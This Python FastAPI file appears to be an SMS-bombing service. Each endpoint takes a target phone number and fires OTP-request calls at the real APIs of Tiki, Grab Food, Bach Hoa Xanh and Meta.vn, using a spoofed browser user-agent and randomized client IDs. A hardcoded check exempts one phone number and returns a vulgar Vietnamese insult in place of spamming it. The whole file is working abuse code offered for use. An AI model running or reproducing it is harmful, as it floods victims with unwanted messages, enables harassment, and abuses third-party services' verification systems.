from typing import Optional
from fastapi import FastAPI
import requests
import random
def random_id(length):
    number = '0123456789'
    alpha = 'abcdefghijklmnopqrstuvwxyz'
    id = ''
    for i in range(0,length,2):
        id += random.choice(number)
        id += random.choice(alpha)
    return id

app = FastAPI()

headers = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
}

def tiki(phone):
    if phone == "0395524153" and "84395524153":
        return "Spam Số Tao Làm Lồn À!"
    else:
        try:
            json_data = {
                    'phone_number': phone,
                }
            response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=headers, json=json_data).text
            return response_tiki
        except:
            return "Lỗi Không Xác Định!"

def grab_food(phone):
    if phone == "0395524153" and "84395524153":
        return "Spam Số Tao Làm Lồn À!"
    else:
        try:
            json_data = {
                'client_id': random_id(32),
                'ctx_id': random_id(32),
                'transaction_ctx': None,
                'country_code': 'VN',
                'method': 'SMS',
                'num_digits': 6,
                'scope': 'openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile',
                'phone_number': phone,
            }
            response_grab_food = requests.post('https://partner-api.grab.com/grabid/v1/oauth2/otp', headers=headers, json=json_data).text
            return response_grab_food
        except:
            return "Lỗi Không Xác Định!"
    
def bach_hoa_xanh(phone):
    if phone == "0395524153" and "84395524153":
        return "Spam Số Tao Làm Lồn À!"
    else:
        try:
            data = {
                'phone': phone,
                'objectId': random_id(36),
                'type': '4',
            }
            response_bach_hoa_xanh = requests.post('https://www.bachhoaxanh.com/aj/Customer/SendOTP', headers=headers, data=data).text
            return response_bach_hoa_xanh
        except:
            return "Lỗi Không Xác Định!" 
    
def meta_vn(phone):
    if phone == "0395524153" and "84395524153":
        return "Spam Số Tao Làm Lồn À!"
    else:
        try:
            params = {
                'api_mode': '1',
            }

            json_data = {
                'api_args': {
                    'lgUser': phone,
                    'act': 'send',
                    'type': 'phone',
                },
                'api_method': 'CheckExist',
            }

            response_meta_vn = requests.post('https://meta.vn/app_scripts/pages/AccountReact.aspx', params=params, headers=headers, json=json_data).text
            return response_meta_vn
        except:
            return "Lỗi Không Xác Định!"    
@app.post("/tiki")
def read_item(phone: Optional[str] = None):
    done = tiki(phone)
    return done

@app.post("/grab-food")
def read_item(phone: Optional[str] = None):
    done = grab_food(phone)
    return done

@app.post("/bach-hoa-xanh")
def read_item(phone: Optional[str] = None):
    done = bach_hoa_xanh(phone)
    return done

@app.post("/meta-vn")
def read_item(phone: Optional[str] = None):
    done = meta_vn(phone)
    return done
